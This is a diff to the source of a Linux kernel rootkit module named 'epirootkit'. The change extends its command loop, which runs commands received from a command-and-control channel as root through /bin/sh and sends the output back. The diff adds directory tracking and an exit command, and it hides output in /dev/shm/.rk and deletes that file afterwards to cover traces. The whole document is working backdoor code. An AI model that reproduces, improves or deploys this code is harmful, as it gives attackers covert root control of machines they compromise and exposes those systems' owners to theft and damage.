@@ -16,6 +16,7 @@
 #include <linux/list.h>
 #include <linux/uio.h>
 #include <linux/security.h>
+#include <linux/namei.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Team_Rodrien");
@@ -41,6 +42,7 @@ static struct task_struct *g_conn_thread = NULL;
 static struct task_struct *g_cmd_thread = NULL;
 static int connection_state = 0;
 static struct list_head *prev_module = NULL;
+static char working_directory[256] = "/";
 
 static void notify_connection_state(int new_state) {
     if (new_state != connection_state) {
@@ -105,6 +107,7 @@ static int command_loop(void *data) {
     loff_t pos;
     ssize_t rlen;
     char outbuf[1024];
+    const char *tmp_output_path = "/dev/shm/.rk";
 
     pr_info("epirootkit: command_loop started\n");
 
@@ -133,7 +136,22 @@ static int command_loop(void *data) {
             continue;
         }
 
-        snprintf(full_cmd, sizeof(full_cmd), "%s > /tmp/.rk_out 2>&1", buffer);
+        if (strncmp(buffer, "cd ", 3) == 0) {
+            const char *path = buffer + 3;
+            if (strlen(path) > 0 && strlen(path) < sizeof(working_directory)) {
+                strncpy(working_directory, path, sizeof(working_directory) - 1);
+                working_directory[sizeof(working_directory) - 1] = '\0';
+            }
+            send_to_c2("--EOF--\n", 8);
+            continue;
+        }
+
+        if (strcmp(buffer, "exit") == 0) {
+            send_to_c2("Shutting down\n--EOF--\n", 20);
+            do_exit(0);
+        }
+
+        snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1", working_directory, buffer, tmp_output_path);
         argv[0] = "/bin/sh";
         argv[1] = "-c";
         argv[2] = full_cmd;
@@ -147,18 +165,21 @@ static int command_loop(void *data) {
         if (ret)
             continue;
 
-        f = filp_open("/tmp/.rk_out", O_RDONLY, 0);
+        f = filp_open(tmp_output_path, O_RDONLY, 0);
         if (!IS_ERR(f)) {
             pos = 0;
             do {
                 memset(outbuf, 0, sizeof(outbuf));
-                rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
+                rlen = kernel_read(f, outbuf, sizeof(outbuf) - 1, &pos);
                 if (rlen > 0) {
                     send_to_c2(outbuf, rlen);
-                    pos += rlen;
                 }
             } while (rlen > 0);
             filp_close(f, NULL);
+
+            struct path path;
+            if (kern_path(tmp_output_path, LOOKUP_REMOVE, &path) == 0)
+                vfs_unlink(path.dentry->d_parent->d_inode, path.dentry, NULL);
         }
         send_to_c2("--EOF--\n", 8);
     }
